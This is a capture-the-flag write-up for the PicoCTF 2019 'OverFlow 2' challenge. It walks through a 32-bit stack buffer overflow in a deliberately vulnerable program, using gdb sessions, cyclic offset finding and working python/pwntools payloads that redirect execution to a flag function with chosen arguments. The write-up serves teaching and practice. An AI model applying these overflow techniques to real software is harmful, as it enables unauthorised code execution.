<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>PicoCTF19 OverFlow 2 - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel=icon href=../../favicon.svg><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link rel=stylesheet href=../../fonts/fonts.css><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../",default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"navy":"ayu"</script><script>var theme,sidebar;try{theme=localStorage.getItem('mdbook-theme'),sidebar=localStorage.getItem('mdbook-sidebar'),theme.startsWith('"')&&theme.endsWith('"')&&localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1)),sidebar.startsWith('"')&&sidebar.endsWith('"')&&localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1))}catch(a){}</script><script>var theme,html;try{theme=localStorage.getItem('mdbook-theme')}catch(a){}(theme===null||theme===void 0)&&(theme=default_theme),html=document.querySelector('html'),html.classList.remove('no-js'),html.classList.remove('ayu'),html.classList.add(theme),html.classList.add('js')</script><script>var html=document.querySelector('html'),sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar')}catch(a){}sidebar=sidebar||'visible'}html.classList.remove('sidebar-visible'),html.classList.add("sidebar-"+sidebar)</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div class=sidebar-scrollbox><ol class=chapter><li class="chapter-item expanded"><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class="chapter-item expanded"><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class="chapter-item expanded"><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_1.html><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-overflow_2.html class=active><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_1.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-new_overflow_2.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 NewOverFlow 2</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-slippery_shellcode.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Slip-Shellcode</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-stringzz.html><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 Stringzz</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf18-learn_libc.html><strong aria-hidden=true>3.1.9.</strong> PicoCTF18 learn-libc</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-rop32.html><strong aria-hidden=true>3.1.10.</strong> PicoCTF19 rop32</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-rop64.html><strong aria-hidden=true>3.1.11.</strong> PicoCTF19 rop64</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-leap_frog.html><strong aria-hidden=true>3.1.12.</strong> PicoCTF19 leap-frog</a><li class="chapter-item expanded"><a href=../../ctf/binary/picoctf19-canary.html><strong aria-hidden=true>3.1.13.</strong> PicoCTF19 CanaRy</a></ol><li class="chapter-item expanded"><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class="chapter-item expanded"><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class="chapter-item expanded"><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class="chapter-item expanded"><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class="chapter-item expanded"><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a><li class="chapter-item expanded"><a href=../../ctf/crypto/auctf20-extraordinary.html><strong aria-hidden=true>3.2.15.</strong> AUCTF20 Extraordinary</a></ol><li class="chapter-item expanded"><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/forensics/aeroctf20-drawings.html><strong aria-hidden=true>3.3.1.</strong> AeroCTF20 Drawings</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Garden</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 Unzip</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 So Meta</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Lies Within</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Extensions</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 Shark Wire</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 WhitePages</a><li class="chapter-item expanded"><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.9.</strong> PicoCTF19 like1000</a></ol><li class="chapter-item expanded"><a href=../../ctf/misc/index.html><strong aria-hidden=true>3.4.</strong> Misc</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/misc/auctf20-bash.html><strong aria-hidden=true>3.4.1.</strong> AUCTF20 Bash</a><li class="chapter-item expanded"><a href=../../ctf/misc/corelightctf20.html><strong aria-hidden=true>3.4.2.</strong> CorelightCTF20</a></ol><li class="chapter-item expanded"><a href=../../ctf/reversing/index.html><strong aria-hidden=true>3.5.</strong> Reversing</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/reversing/auctf20-mrgame.html><strong aria-hidden=true>3.5.1.</strong> AUCTF20 Mr. Game</a></ol><li class="chapter-item expanded"><a href=../../ctf/web/index.html><strong aria-hidden=true>3.6.</strong> Web</a><li><ol class=section><li class="chapter-item expanded"><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.6.1.</strong> SECCON19 Web Search</a><li class="chapter-item expanded"><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.6.2.</strong> TMCTF19F Container</a><li class="chapter-item expanded"><a href=../../ctf/web/insctf20-quals-lowdeep.html><strong aria-hidden=true>3.6.3.</strong> INSCTF20Q LowDeep</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar-hover-placeholder></div><div id=menu-bar class="menu-bar sticky bordered"><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
<i class="fa fa-bars"></i></button>
<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible'),document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible'),Array.from(document.querySelectorAll('#sidebar a')).forEach(function(a){a.setAttribute('tabIndex',sidebar==='visible'?0:-1)})</script><div id=content class=content><main><h1><a class=header href=#picoctf19-overflow-2 id=picoctf19-overflow-2>PicoCTF19 OverFlow 2</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>Now try overwriting arguments. Can you get the flag from this <a href=https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln>program</a>? You can find it in /problems/overflow-2 on the shell server. <a href=https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p>GDB can print the stack after you send arguments<h2><a class=header href=#solution id=solution>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 22:04 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-2_3    33 Sep 28 22:04 flag.txt
-rwxr-sr-x   1 hacksports overflow-2_3  7500 Sep 28 22:04 vuln
-rw-rw-r--   1 hacksports hacksports     794 Sep 28 22:04 vuln.c
</code></pre><p>Let's view <code>vuln.c</code><pre><code>samson@pico-2019-shell1:/problems/overflow-2$ cat vuln.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&quot;Please enter your string: &quot;);
  vuln();
  return 0;
}
</code></pre><p>It seems like a program that takes in some input and prints it back to you. Let's try that and some large input.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ ./vuln
Please enter your string: 
A
A
samson@pico-2019-shell1:/problems/overflow-2$ echo $(python -c &quot;print 'A'*184&quot;) | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
</code></pre><p>We need to invoke the <code>flag()</code> function like <code>flag(0xDEADBEEF, 0xC0DED00D)</code> from <code>vuln()</code>.<p>So let's first try to reproducce what we did in Overflow-1 and get into the <code>vuln()</code> function first.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048676 &lt;+0&gt;:     push   %ebp
   0x08048677 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048679 &lt;+3&gt;:     push   %ebx
   0x0804867a &lt;+4&gt;:     sub    $0xb4,%esp
   0x08048680 &lt;+10&gt;:    call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
   0x08048685 &lt;+15&gt;:    add    $0x197b,%ebx
   0x0804868b &lt;+21&gt;:    sub    $0xc,%esp
   0x0804868e &lt;+24&gt;:    lea    -0xb8(%ebp),%eax
   0x08048694 &lt;+30&gt;:    push   %eax
   0x08048695 &lt;+31&gt;:    call   0x8048430 &lt;gets@plt&gt;
   0x0804869a &lt;+36&gt;:    add    $0x10,%esp
   0x0804869d &lt;+39&gt;:    sub    $0xc,%esp
   0x080486a0 &lt;+42&gt;:    lea    -0xb8(%ebp),%eax
   0x080486a6 &lt;+48&gt;:    push   %eax
   0x080486a7 &lt;+49&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x080486ac &lt;+54&gt;:    add    $0x10,%esp
   0x080486af &lt;+57&gt;:    nop
   0x080486b0 &lt;+58&gt;:    mov    -0x4(%ebp),%ebx
   0x080486b3 &lt;+61&gt;:    leave  
   0x080486b4 &lt;+62&gt;:    ret    
End of assembler dump.
(gdb) b* 0x08048695
Breakpoint 1 at 0x8048695
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*184)')
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*184)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) i f
Stack level 0, frame at 0xffaacbb0:
 eip = 0x8048695 in vuln; saved eip = 0x804871c
(gdb) ni
0x0804869a in vuln ()
(gdb) i f
Stack level 0, frame at 0xffaacbb0:
 eip = 0x804869a in vuln; saved eip = 0x804871c
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*284)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*284)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) i f
Stack level 0, frame at 0xff894ed0:
 eip = 0x8048695 in vuln; saved eip = 0x804871c
(gdb) ni
0x0804869a in vuln ()
(gdb) i f
Stack level 0, frame at 0xff894ed0:
 eip = 0x804869a in vuln; saved eip = 0x41414141
 called by frame at 0xff894ed4
(gdb) x flag
0x80485e6 &lt;flag&gt;:       0x53e58955
</code></pre><p>Through a bunch of trial an error I finally found the input that lets us jump to the <code>flag()</code> function<pre><code class=language-bash>(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
Please enter your string: 

Breakpoint 1, 0x08048695 in vuln ()
(gdb) ni
0x0804869a in vuln ()
(gdb) info frame
Stack level 0, frame at 0xff914d50:
 eip = 0x804869a in vuln; saved eip = 0x80485e6
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2898163) exited normally]
</code></pre><p>Perfect. We're in the <code>flag()</code> function as determined by the output, so let's dig into the function now.<pre><code class=language-bash>(gdb) disas flag
Dump of assembler code for function flag:
   0x080485e6 &lt;+0&gt;:     push   %ebp
   0x080485e7 &lt;+1&gt;:     mov    %esp,%ebp
   0x080485e9 &lt;+3&gt;:     push   %ebx
   0x080485ea &lt;+4&gt;:     sub    $0x54,%esp
   0x080485ed &lt;+7&gt;:     call   0x8048520 &lt;__x86.get_pc_thunk.bx&gt;
   0x080485f2 &lt;+12&gt;:    add    $0x1a0e,%ebx
   0x080485f8 &lt;+18&gt;:    sub    $0x8,%esp
   0x080485fb &lt;+21&gt;:    lea    -0x1850(%ebx),%eax
   0x08048601 &lt;+27&gt;:    push   %eax
   0x08048602 &lt;+28&gt;:    lea    -0x184e(%ebx),%eax
   0x08048608 &lt;+34&gt;:    push   %eax
   0x08048609 &lt;+35&gt;:    call   0x80484a0 &lt;fopen@plt&gt;
   0x0804860e &lt;+40&gt;:    add    $0x10,%esp
   0x08048611 &lt;+43&gt;:    mov    %eax,-0xc(%ebp)
   0x08048614 &lt;+46&gt;:    cmpl   $0x0,-0xc(%ebp)
   0x08048618 &lt;+50&gt;:    jne    0x8048636 &lt;flag+80&gt;
   0x0804861a &lt;+52&gt;:    sub    $0xc,%esp
   0x0804861d &lt;+55&gt;:    lea    -0x1844(%ebx),%eax
   0x08048623 &lt;+61&gt;:    push   %eax
   0x08048624 &lt;+62&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x08048629 &lt;+67&gt;:    add    $0x10,%esp
   0x0804862c &lt;+70&gt;:    sub    $0xc,%esp
   0x0804862f &lt;+73&gt;:    push   $0x0
   0x08048631 &lt;+75&gt;:    call   0x8048470 &lt;exit@plt&gt;
   0x08048636 &lt;+80&gt;:    sub    $0x4,%esp
   0x08048639 &lt;+83&gt;:    pushl  -0xc(%ebp)
   0x0804863c &lt;+86&gt;:    push   $0x40
   0x0804863e &lt;+88&gt;:    lea    -0x4c(%ebp),%eax
   0x08048641 &lt;+91&gt;:    push   %eax
   0x08048642 &lt;+92&gt;:    call   0x8048440 &lt;fgets@plt&gt;
   0x08048647 &lt;+97&gt;:    add    $0x10,%esp
   0x0804864a &lt;+100&gt;:   cmpl   $0xdeadbeef,0x8(%ebp)
   0x08048651 &lt;+107&gt;:   jne    0x804866d &lt;flag+135&gt;
   0x08048653 &lt;+109&gt;:   cmpl   $0xc0ded00d,0xc(%ebp)
   0x0804865a &lt;+116&gt;:   jne    0x8048670 &lt;flag+138&gt;
   0x0804865c &lt;+118&gt;:   sub    $0xc,%esp
   0x0804865f &lt;+121&gt;:   lea    -0x4c(%ebp),%eax
   0x08048662 &lt;+124&gt;:   push   %eax
   0x08048663 &lt;+125&gt;:   call   0x8048420 &lt;printf@plt&gt;
   0x08048668 &lt;+130&gt;:   add    $0x10,%esp
   0x0804866b &lt;+133&gt;:   jmp    0x8048671 &lt;flag+139&gt;
   0x0804866d &lt;+135&gt;:   nop
   0x0804866e &lt;+136&gt;:   jmp    0x8048671 &lt;flag+139&gt;
   0x08048670 &lt;+138&gt;:   nop
   0x08048671 &lt;+139&gt;:   mov    -0x4(%ebp),%ebx
   0x08048674 &lt;+142&gt;:   leave  
   0x08048675 &lt;+143&gt;:   ret    
End of assembler dump.
</code></pre><p>The lines that stand out the most to me are:<pre><code>...
cmpl   $0xdeadbeef,0x8(%ebp)
...
cmpl   $0xc0ded00d,0xc(%ebp)
...
</code></pre><p>So what this is suggesting is that it's comparing the second and third values from the <code>ebp</code> register which is the bottom of the stack, so we should overwrite the return address, and add our first and second arguments to the stack<p>So let's set some breakpoints there.<pre><code class=language-bash>(gdb) b* 0x0804864a
Breakpoint 1 at 0x804864a
(gdb) b* 0x08048653
Breakpoint 2 at 0x8048653
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;)')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2899300) exited normally]
</code></pre><p>Oh wait, in GDB the flag function exits first. So I guess we'll have to follow the hint... inspect the stack
Let's append some input into it.<pre><code class=language-bash>(gdb) b* 0x080485e6
Breakpoint 1 at 0x80485e6
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*8+&quot;B&quot;*8)')
Starting program: /problems/overflow-2/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*8+&quot;B&quot;*8)')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Breakpoint 1, 0x080485e6 in flag ()
(gdb) info stack
#0  0x080485e6 in flag ()
#1  0x41414141 in ?? ()
#2  0x41414141 in ?? ()
#3  0x42424242 in ?? ()
#4  0x42424242 in ?? ()
#5  0xff8e7b00 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
</code></pre><p>So remember the stack grows from the EBP, so our first and second arguments are between <code>#1-#4</code>. However, the code seems to be looking at <code>ebp+8</code> so let's send <code>4 A's</code> before our arguments.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print &quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*4+&quot;\xef\xbe\xad\xde&quot;+&quot;\x0d\xd0\xde\xc0&quot;' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
</code></pre><p><code>r &lt; &lt;(python -c 'from pwn import *; print "A"*176+"B"*12+p32(0x080485E6)+"A"*4+p32(0xDEADBEEF)+p32(0xC0DED00D)')</code><p>Also works.<h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{arg5_and_r3turn51b106031}</code><h2><a class=header href=#alternative-solution---pwntools id=alternative-solution---pwntools>Alternative Solution - PwnTools</a></h2><p>To recap, <code>vuln</code> allocates a buffer of size <code>176</code> on the stack and then uses <code>gets</code> a vulnerable function to read from it.<p>The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.<p>A more detailed explanation can be found on Overflow 1 for the Pwntools cyclic module.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
Starting program: /problems/overflow-2/vuln &lt; &lt;(cyclic 200)
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()
</code></pre><p>Let's find the offset for those hex values.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ cyclic -l 0x62616177
188
</code></pre><p>So remember the stack grows from the EBP, so our first and second arguments are between <code>#1-#4</code>. However, the code seems to be looking at <code>ebp+8</code> so let's send <code>4 A's</code> before our arguments.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print &quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*4+&quot;\xef\xbe\xad\xde&quot;+&quot;\x0d\xd0\xde\xc0&quot;' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c &quot;from pwn import *; print('A'*188 + p32(0x080485e6) + 'A'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D))&quot; | ./vuln
Please enter your string: 
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
</code></pre><h2><a class=header href=#alternative-without-gdb id=alternative-without-gdb>Alternative without GDB</a></h2><pre><code class=language-bash>$ cyclic 200 | ./vuln
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

$ dmesg | grep vuln
[123123] vuln[3738]: segfault at 62616177 ip 0000000062616177 sp 00000000ffde7fe0 error 14 in libc-2.27.so[f7d1b000+19000]

$ cyclic -l 0x62616177
188
</code></pre></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-new_overflow_1.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-new_overflow_1.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" 